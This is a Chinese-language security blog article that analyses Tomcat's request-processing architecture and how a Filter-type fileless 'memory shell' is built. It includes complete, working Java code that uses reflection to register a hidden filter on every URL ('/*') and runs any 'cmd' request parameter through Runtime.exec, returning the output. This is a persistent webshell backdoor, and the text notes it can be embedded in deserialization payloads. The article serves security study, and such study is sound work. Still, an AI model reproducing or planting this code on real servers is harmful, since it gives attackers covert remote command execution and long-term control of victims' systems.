# Tomcat 内存马技术分析（一）—— Filter型

阅读量 **187248**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-02-17 10:30:03

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t015ca7189e022a3bec.jpg)

内存马技术早在前几年就已经在广泛使用，通俗的名字为不落地马或者无文件马。这种马的实现技术相对于传统马来说更为复杂，但是随着产品安全防护等级的不断提高，内存马技术也就运用而生。好在是这一块领域很多师傅都以已经趟过坑了，笔者站在巨人的肩膀上总结梳理内存马技术，打算出一个系列专题详细分析tomcat内存马的不同类型以及其内存马检测及查杀技术。

## 0x01 内存马种类

现有的内存马主要分为四个类型，Listener型、Filter型、Servlet型以及Agent型，不同类型的内存马涉及到的知识点也不太一样。在用户请求网站的时候,
前三个内存马的触发顺序为Listener -> Filter -> Servlet。

![](https://p2.ssl.qhimg.com/t0175ff15200caa8f10.png)

###  0x1 Listener型

一开始在学习Tomcat内存马技术的时候，对该Listener型内存木马有些生疏。Listener是Java
web中的监听器，不熟悉的小伙伴很容易将Listener理解成跟端口监听有关的功能模块，其实这里的监听指的是监测某个java对象成员变量或成员方法的变化，当被监听对象发生上述变化后，监听器某个方法将会被立即执行。Listener内存马是通过动态注册一个Listener，其监听到某个参数传入时，触发某个监听器方法，实现内存马功能。

###  0x2 Filter型

如上图所示Filter处在请求处理的关键位置，如果是写过Java
web的小伙伴，必然对Filter的配置有深刻的印象，一般在项目的web.xml中注册Filter来对某个Servlet程序进行拦截处理。这个注册的Filter就变成了客户端访问和最终负责请求数据处理之间的必经之路，如果我们对Filter中的内容进行修改，就可以实现请求数据预处理。

###  0x3 Servlet型

Servlet在Java
web开发和安全审计中最常用到的名词，Servlet一般与访问路由对应。Servlet的生命周期在Web容器启动的时候就开始了，当Context获得请求时，将在自己的映射表中寻找相匹配的Servlet类。Servlet型的核心原理是注册一个恶意的Servlet，并把Servlet与相对应的URL绑定。

## 0x02 Tomcat 架构分析

内存马的学习过程其实和反序列化很相似，如果会使用内存马很简单，但是要知道如何构造就需要很多前置知识。这就好比在学反序列化时要学习反射和动态代理等java的特性。那么在学习Tomcat内存马的时候就需要掌握Tomcat相关架构特性。

###  0x1 简介

Tomcat是一个免费的开放源代码的Servlet容器，Tomcat 容器是对 Servlet 规范的实现，也称为 Servlet
引擎。Tomcat为了更好的处理来自客户端的请求，设计了一套功能完善的处理引擎，其中包括了Container、Engine、Host、Context、Wrapper等模块功能。笔者重点分析他们之间的关联关系及架构组成。

###  0x2 架构组成

![](https://p0.ssl.qhimg.com/t01077f6311fd0659d4.png)

从上图可以粗略的分析出他们之间的层级调用关系。

  * Server：表示整个 Tomcat Catalina servlet 容器，Server 中可以有多个 Service。
  * Service：表示Connector和Engine的组合，对外提供服务，Service可以包含多个Connector和一个Engine。
  * Connector：为Tomcat Engine的连接组件，支持三种协议：HTTP/1.1、HTTP/2.0、AJP。
  * Container：负责封装和管理Servlet 处理用户的servlet请求，把socket数据封装成Request，传递给Engine来处理。
  * Engine：顶级容器，不能被其他容器包含，它接受处理连接器的所有请求，并将响应返回相应的连接器，子容器通常是 Host 或 Context。
  * Host：表示一个虚拟主机，包含主机名称和IP地址，这里默认是localhost，父容器是 Engine，子容器是 Context。
  * Context：表示一个 Web 应用程序，是 Servlet、Filter 的父容器。
  * Wrapper：表示一个 Servlet，它负责管理 Servlet 的生命周期，并提供了方便的机制使用拦截器。

###  0x3 关联关系

、

从一次服务访问请求探究他们之间的组成关系，如上图所示，配置了HTTP和Ajp两个对外开放端口，同时对应了两个Connector分别负责请求数据包的封包、处理、转发工作，该过程如下图Connector中显示的操作流程。Connector将解析好的Request对象传递给Container，Container
使用Pipeline-Valve管道来处理请求，如下图Pipeline请求流程。直到WrapperValve创建并调用ApplicationFilterChain，最后调用Servlet执行路由处理。

![](https://p3.ssl.qhimg.com/t01849288e213485f9c.png)

###  0x4 Connector

Connector是Tomcat中的连接器，在Tomcat启动时它将监听配置文件中配置的服务端口，从端口中接受数据，并封装成Request对象传递给Container组件，如下图所示：

![](https://p2.ssl.qhimg.com/t0194125de84cacc905.png)

tomcat 中 ProtocolHandler 的默认实现类是
Http11NioProtocol，在高版本tomcat中Http11Nio2Protocol也是其中的一个实现类。

ProtocolHandler来处理网络连接和应用层协议，包含两个重要组件：endpoint和processor，endpoint是通信端点，即通信监听的接口，是具体的socket接受和发送处理器，是对传输层的抽象，processor接受来自endpoint的socket，读取字节流解析成Tomcat的request和response对象，并通过adapter将其提交到容器处理，processor是对应用层协议的抽象。总结如下：

  * endpoint：处理来自客户端的连接请求。
  * processor：接受来自endpoint的socket，读取字节流解析成Tomcat的request和response对象。
  * adapter：将封装好的request转交给Container处理，连接Connector和Container。

###  0x5 Container

在Tomcat中，容器（Container）主要包括四种，Engine、Host、Context和Wrapper。也就是这个图中包含的四个子容器。由下图可以看出，Container在处理请求时使用的Pipeline管道，Pipeline
是一个很常用的处理模型，和 FilterChain 大同小异，都是责任链模式的实现，Pipeline 内部有多个 Valve，这些 Valve
因栈的特性都有机会处理请求和响应。上层的Valve会调用下层容器管道，一步一步执行到FilterChain过滤链。

![](https://p1.ssl.qhimg.com/t01fbc914fe7f548c3f.png)

###  0x6 Context

servletContext负责的是servlet运行环境上下信息，不关心session管理，cookie管理，servlet的加载，servlet的选择问题，请求信息，主要负责servlet的管理。

StandardContext主要负责管理session，Cookie，Servlet的加载和卸载，负责请求信息的处理，掌握控制权。ServletContext主要是适配Servlet规范，StandardContext是tomcat的一种容器，当然两者存在相互对应的关系。

![](https://p4.ssl.qhimg.com/t016c3ead226441d6a6.png)

在Tomcat中对应的ServletContext实现是ApplicationContext。Tomcat惯用Facade方式，因此在web应用程序中获取到的ServletContext实例实际上是一个ApplicationContextFacade对象，对ApplicationContext实例进行了封装。而ApplicationContext实例中含有Tomcat的Context容器实例（StandardContext实例，也就是在server.xml中配置的Context节点），以此来获取/操作Tomcat容器内部的一些信息，例如获取/注册servlet等。Filter内存马的实现也是基于此知识点获取到了存储在StandardContext中的filterConfigs
HashMap结构。

## 0x03 环境搭建

采用简单的Spring-boot可以快速搭建web项目，并且使用Spring内置的轻量级Tomcat服务，虽然该Tomcat阉割了很多功能，但是基本够用。整个demo放在了github上，地址为<https://github.com/BabyTeam1024/TomcatResponseLearn>

###  0x1 创建项目

选择Spring Initializr

![](https://p2.ssl.qhimg.com/t0183c626e93bf4486b.png)

###  0x2 添加代码

在项目的package中创建controller文件夹，并编写TestController类

    
    
    package com.example.tomcatresponselearn.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.ResponseBody;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    
    @Controller
    @RequestMapping("/app")
    public class TestController {
    
        @RequestMapping("/test")
        @ResponseBody
        public String testDemo(String input, HttpServletResponse response) throws IOException {
    
            return "Hello World!";
        }
    }
    

正常在编写Spring-boot代码的时候是不需要在testDemo函数中添加调用参数的。这里为了方便查看Response对象，因此在该函数上添加了HttpServletResponse。

###  0x3 添加Maven地址

在ubuntu上搭建环境的时候遇到了依赖包下载失败的情况。

![](https://p1.ssl.qhimg.com/t0102baaca3f5f76a39.png)

添加如下仓库地址即可解决问题

    
    
    https://repo.maven.apache.org/maven2
    

## 0x04 Filter内存马

###  0x1 Tomcat 加载注册Filter

在StandardContext类中的startInternal方法里可以看到这样的加载顺序

![](https://p3.ssl.qhimg.com/t014407b842d95f06a9.png)

先启动listener，再者是Filter，最后是Servlet。详细分析filterStart中是如何加载Filter链的，相关代码如下图所示：

![](https://p2.ssl.qhimg.com/t018cedb80524ac45ca.png)

首先通过遍历从filterDefs中获取key和value，将value封装为ApplicationFilterConfig对象放入filterConfigs变量中。

笔者为了研究Tomcat在启动时是如何将Filter添加到FilterMap中的，于是在StandardContext类的add方法中下了断点，如下图所示：

![](https://p0.ssl.qhimg.com/t01706e4ac6b485b898.png)

根据调用栈可以溯源Tomcat是如何加载这些filter的，如下图所示：

![](https://p2.ssl.qhimg.com/t0126664260b46883a8.png)

根据该调用栈可以发现Tomcat是通过addMappingForUrlPatterns实现Filter加载，该部分代码如下图所示：

![](https://p5.ssl.qhimg.com/t019351bd5360d1f6b7.png)

servletContext.addFilter中的实现逻辑如下

    
    
    filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
    this.context.addFilterDef(filterDef);
    

在addFilter函数的最后创建并返回了ApplicationFilterRegistration对象，并通过addMappingForUrlPatterns方法注册路由，相关实现逻辑如下：

    
    
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(this.filterDef.getFilterName());
    filterMap.setDispatcher(dispatcherType.name());
    filterMap.addURLPattern(urlPattern);
    this.context.addFilterMapBefore(filterMap);
    

其中涉及到了三个比较重要的变量：

  * filterDefs：包含过滤器实例和名称
  * filterMaps：包含所有过滤器的URL映射关系
  * filterConfigs：包含所有与过滤器对应的filterDef信息及过滤器实例

###  0x2 动态添加Filter

根据Tomcat注册Filter的操作，可以大概得到如何动态添加一个Filter

  * 获取standardContext
  * 创建Filter
  * 使用filterDef封装Filter对象，将filterDef添加到filterDefs
  * 创建filterMap，将URL和filter进行绑定，添加到filterMaps中
  * 使用ApplicationFilterConfig封装filterDef对象，添加到filterConfigs中

通过分析得到动态添加Filter只需5个步骤，下面笔者将根据Tomcat注册Filter的操作，通过反射操作实现动态添加Filter。

**1\. 获取standardContext**

获取standardContext多种多样，StandardContext主要负责管理session，Cookie，Servlet的加载和卸载。因此在Tomcat中的很多地方都有保存。如果我们能够直接获取request的时候，可以使用以下方法直接获取context。  
Tomcat在启动时会为每个Context都创建个ServletContext对象，表示一个Context。从而可以将ServletContext转化为StandardContext。  
​

    
    
    ServletContext servletContext = request.getSession().getServletContext();
    
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
    

获取到standardContext就可以很方便的将其他对象添加在Tomcat Context中。

**2\. 创建Filter**

直接在代码中实现Filter实例，需要重写三个重要方法，init、doFilter、destory，如下面代码所示：

    
    
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null){
                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                return;
            }
            filterChain.doFilter(servletRequest,servletResponse);
        }
        @Override
        public void destroy() {
        }
    };
    

在doFilter方法中实现命令执行回显功能。

**3\. 创建filterDef封装Filter对象**

为了之后将内存马融合进反序列化payload中，这里特意使用反射获取FilterDef对象。如果使用的是jsp或者是非反序列化的利用，那么可以直接使用new创建对象。

    
    
    Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
    FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
    o.setFilter(filter);
    o.setFilterName(FilterName);
    o.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(o);
    

setFilter方法将自己创建的Filter绑定在FilterDef中，setFilterName设置的是Filter的名称，最后把FilterDef添加在standardContext的FilterDefs变量中。

**4\. 创建filterMap绑定URL**

通过反射创建FilterMap实例，该部分代码主要是注册filter的生效路由，并将FilterMap对象添加在standardContext中FilterMaps变量的第一个。

    
    
    Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
    org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
    
    o1.addURLPattern("/*");
    o1.setFilterName(FilterName);
    o1.setDispatcher(DispatcherType.REQUEST.name());//只支持 Tomcat 7.x 以上
    standardContext.addFilterMapBefore(o1);
    

**5\. 获取filterConfigs变量，并向其中添加filterConfig对象**

首先获取在standardContext中存储的filterConfigs变量。

    
    
    Configs = StandardContext.class.getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    filterConfigs = (Map) Configs.get(standardContext);
    

之后通过反射生成ApplicationFilterConfig对象，并将其放入filterConfigs hashMap中。

    
    
    Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
    Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
    declaredConstructor1.setAccessible(true);
    ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
    filterConfigs.put(FilterName,filterConfig);
    

###  0x3 完整代码

完整代码主要参照了nice_0e3师傅的文章，在最后结果输出的时候要注意如果有两次response结果需要将第一次的Writer flush
掉，避免在后台报错。

    
    
    Field Configs = null;
    Map filterConfigs;
    try {
        //Step 1
        ServletContext servletContext = request.getSession().getServletContext();
    
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    
        String FilterName = "cmd_Filter";
        Configs = StandardContext.class.getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        filterConfigs = (Map) Configs.get(standardContext);
        //Step 2
        if (filterConfigs.get(FilterName) == null){
            Filter filter = new Filter() {
    
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {
    
                }
    
                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter("cmd") != null){
    
                        InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                        //
                        Scanner s = new Scanner(in).useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        servletResponse.getWriter().write(output);
    
                        return;
                    }
                    filterChain.doFilter(servletRequest,servletResponse);
                }
                @Override
                public void destroy() {
                }
            };
            //Step 3
            Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
            FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
            o.setFilter(filter);
            o.setFilterName(FilterName);
            o.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(o);
            //Step 4
            Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
            org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
    
            o1.addURLPattern("/*");
            o1.setFilterName(FilterName);
            o1.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(o1);
    
            //Step 5
            Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
            declaredConstructor1.setAccessible(true);
            ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
            filterConfigs.put(FilterName,filterConfig);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    

## 0x05 总结

本文主要学习了Tomcat架构组成及各模块组件之间的关联关系，重点分析Connector、Container和Context在整个数据请求处理过程中发挥的作用。通过梳理Tomcat在启动过程中FilterChain的注册流程，分析清楚如何动态注册加载自己设计的Filter对象。之后的文章将继续分析Tomcat内存马Listener、Servlet等实现技术以及各种查杀技术，最后感谢各位师傅关于内存马知识的总结分享。

## 参考文章

<https://blog.szfszf.top/article/49/>  
<https://uuzdaisuki.com/2021/06/29/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98webshell/>  
<https://paper.seebug.org/1441/#1jsp-webshell>  
<https://blog.csdn.net/littlewhitevg/article/details/107671946>  
<https://www.cnblogs.com/chuonye/p/10770984.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/266240](/post/id/266240)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Tomcat](/tag/Tomcat)
  * [内存马](/tag/内存马)
  * [filter](/tag/filter)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

